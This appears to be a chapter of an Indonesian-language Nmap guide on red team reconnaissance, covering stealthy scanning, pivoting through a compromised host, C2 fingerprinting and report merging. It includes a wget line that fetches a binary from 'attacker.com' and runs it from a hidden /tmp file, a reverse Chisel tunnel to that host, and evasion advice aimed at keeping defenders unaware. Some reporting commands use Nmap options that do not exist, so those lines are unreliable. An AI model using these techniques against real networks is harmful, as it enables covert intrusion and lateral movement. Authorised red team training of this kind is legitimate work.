# BAB 11 — Nmap dalam Red Team Operations

> **NMAP Advanced Guide · 2026 Edition**

---

## Red Team vs Penetration Testing

| Aspek | Penetration Test | Red Team |
|-------|-----------------|----------|
| Tujuan | Temukan kerentanan | Simulasi adversary nyata |
| Scope | Luas, semua sistem | Terbatas, seperti APT spesifik |
| Durasi | Days-weeks | Weeks-months |
| Notifikasi | Blue team tahu | Blue team tidak tahu |
| Nmap Approach | Comprehensive scan | Stealth, low-and-slow |
| OPSEC | Tidak wajib | Wajib |

---

## OPSEC dalam Rekon: Prinsip Dasar

**OPSEC (Operational Security)** = mencegah target mendeteksi kegiatan rekon kamu.

```bash
# BURUK - langsung dari mesin personal:
nmap -sS -T4 -sV -A target.com

# BAIK - melalui chain:
# Attacker → VPN → Jump Host → Proxy → Target

# Atau melalui residential proxy:
proxychains nmap -sS -T2 -p 80,443,8080 target.com

# TERBAIK untuk red team: scan dari compromised host yang ada di network target
# (lateral movement - bukan dari luar)
```

---

## Scanning dari Compromised Host (Pivot)

```bash
# Skenario: Kamu sudah punya shell di host 192.168.1.50
# Kamu ingin scan 192.168.10.0/24 yang hanya accessible dari sana

# Option 1: Upload Nmap ke compromised host
# Transfer via curl/wget:
wget -q http://attacker.com/nmap-static -O /tmp/.nmap && chmod +x /tmp/.nmap
/tmp/.nmap -sS -T2 -p 22,80,443,3389 192.168.10.0/24 -oG /tmp/.results

# Option 2: Dynamic SOCKS proxy via SSH
ssh -D 1080 user@192.168.1.50
proxychains nmap -sT -T2 -p 22,80,443 192.168.10.0/24
# Note: proxychains hanya support sT (Connect scan), bukan sS

# Option 3: SSH local port forward + Nmap
ssh -L 2222:192.168.10.1:22 user@192.168.1.50
# Sekarang akses 192.168.10.1:22 via localhost:2222

# Option 4: Chisel (modern SOCKS5 tunnel)
# Di compromised host:
./chisel server -p 8080 --reverse
# Di attacker:
./chisel client attacker.com:8080 R:1080:socks
proxychains nmap -sT 192.168.10.0/24
```

---

## Static Nmap Binary untuk Deployment

```bash
# Ketika tidak bisa install nmap di target
# Gunakan static binary yang sudah pre-compiled

# Download dari GitHub nmap releases atau compile sendiri:
git clone https://github.com/andrew-d/static-binaries
ls static-binaries/binaries/linux/x86_64/nmap

# Atau compile static:
cd nmap-source/
./configure --enable-static --with-libdnet=included --with-libpcap=included
make static

# Deploy ke target (pastikan executable):
scp nmap-static user@192.168.1.50:/tmp/.n
ssh user@192.168.1.50 "chmod +x /tmp/.n && /tmp/.n -sT -p 22,80 192.168.10.1"
```

---

## Living off the Land: Minimal Nmap Alternative

```bash
# Ketika bahkan binary pun tidak bisa diupload
# Gunakan built-in tools untuk basic port discovery

# Bash port scanner (TCP connect):
scan_ports() {
    local host=$1
    for port in 21 22 23 25 80 110 139 143 443 445 1433 3306 3389 5432 8080; do
        (echo >/dev/tcp/$host/$port) 2>/dev/null && echo "OPEN: $host:$port"
    done 2>/dev/null
}
scan_ports 192.168.10.1

# Subnet scan:
for i in $(seq 1 254); do
    (ping -c1 -W1 192.168.10.$i &>/dev/null && echo "UP: 192.168.10.$i") &
done
wait

# Python one-liner:
python3 -c "
import socket, sys
host = sys.argv[1]
for p in [22,80,443,3389,8080]:
    try:
        s = socket.socket()
        s.settimeout(0.5)
        s.connect((host, p))
        print(f'OPEN: {p}')
        s.close()
    except: pass
" 192.168.10.1
```

---

## C2 Infrastructure Rekon

Red team sering perlu scan infrastruktur C2 mereka sendiri atau competitor (dalam scope):

```bash
# Fingerprint Cobalt Strike team server
# CS default: port 50050, 443, 80, beaconing patterns
nmap --script ssl-cert -p 443,50050 10.10.10.1

# CS sertifikat default menggunakan CN "Major Cobalt Strike":
nmap --script ssl-cert -p 443 10.10.10.1 | grep -i "cobalt\|Forged\|Major"

# Metasploit stager detection (pattern di web service)
nmap --script http-methods,http-title -p 443,8443 10.10.10.1

# Empire/Havoc C2 detection
nmap -sV --script banner -p 80,443,8080 10.10.10.1
```

---

## Timestamp dan Evidence Management

```bash
# Red team perlu manage timestamps untuk forensik jika ada insiden
# Nmap otomatis mentions waktu di outputnya

# Gunakan --append-output untuk log continuous
nmap -sS target.com --append-output -oG /var/log/redteam/$(date +%Y%m%d).gnmap

# Log dengan timestamp eksplisit
nmap -sS target.com -oX - | tee >(sed "s/<runstats>/<runstats><epoch>$(date +%s)<\/epoch>/" > /var/log/scan_$(date +%s).xml)

# Compress dan enkripsi log (OPSEC)
nmap -sS target.com -oX - | gzip | openssl enc -aes-256-cbc -k "passphrase" > scan_$(date +%s).xml.enc

# Dekripsi saat review:
openssl enc -d -aes-256-cbc -k "passphrase" -in scan_1234567.xml.enc | gunzip | xmllint --format -
```

---

## Rekon Domain/Company Intelligence

```bash
# Enumerasi aset target sebelum scan
# (passive recon dulu)

# WHOIS untuk IP ranges milik target
whois company.com | grep -i "netrange\|CIDR\|NetName"

# ASN lookup
curl -s "https://ipinfo.io/AS12345/json" | python3 -m json.tool
# Atau:
whois -h whois.radb.net "!gas12345"

# Certificate Transparency untuk domain discovery
curl -s "https://crt.sh/?q=%.company.com&output=json" |
python3 -c "import json,sys; [print(x['name_value']) for x in json.load(sys.stdin)]" |
sort -u

# Setelah dapat IP ranges, scan dengan Nmap:
nmap -sn 203.0.113.0/24 --reason | grep "report\|up"
```

---

## Attack Chain dengan Nmap Data

```bash
# Fase 1: Host discovery (ultra-quiet)
sudo nmap -sn -T1 --scan-delay 5s 192.168.1.0/24 -oG hosts.gnmap
grep "Up" hosts.gnmap | awk '{print $2}' > live_hosts.txt

# Fase 2: Port scan pada live hosts saja
sudo nmap -sS -T2 -iL live_hosts.txt --top-ports 100 -oX ports.xml

# Fase 3: Service version detection (hanya port open)
python3 -c "
import xml.etree.ElementTree as ET
tree = ET.parse('ports.xml')
targets = []
for host in tree.findall('host'):
    ip = host.find('.//address[@addrtype=\"ipv4\"]').get('addr')
    for port in host.findall('.//port'):
        state = port.find('state')
        if state is not None and state.get('state') == 'open':
            targets.append(f'{ip}:{port.get(\"portid\")}')
print('\n'.join(targets))
" > open_services.txt

# Fase 4: Targeted version detection
while read target; do
    ip=$(echo $target | cut -d: -f1)
    port=$(echo $target | cut -d: -f2)
    nmap -sV -sC -p $port $ip --append-output -oX detail_$(echo $ip | tr '.' '_').xml &
done < open_services.txt
wait

echo "[+] Attack chain recon complete"
```

---

## Reporting untuk Red Team Engagement

```bash
# Aggregate semua XML hasil scan
nmap --xml-merge /tmp/scans/*.xml -oX merged_final.xml 2>/dev/null ||
# Merge manual:
python3 << 'EOF'
import xml.etree.ElementTree as ET
import glob

merged = ET.Element('nmaprun')
merged.set('scanner', 'nmap')
merged.set('args', 'merged')

for xml_file in glob.glob('/tmp/scans/*.xml'):
    try:
        tree = ET.parse(xml_file)
        for host in tree.findall('host'):
            merged.append(host)
    except ET.ParseError:
        pass

ET.indent(merged)
ET.ElementTree(merged).write('/tmp/merged_final.xml', xml_declaration=True)
print("[+] Merged", len(list(merged)), "hosts")
EOF

# Convert ke CSV untuk reporting
nmap -oG - -iX merged_final.xml 2>/dev/null | grep "Ports:" |
awk '{print $2, $NF}' > services_summary.csv
```

---

*← [BAB 10: Automation Pipeline](bab10.md) · Selanjutnya → [BAB 12: Performance Tuning](bab12.md)*
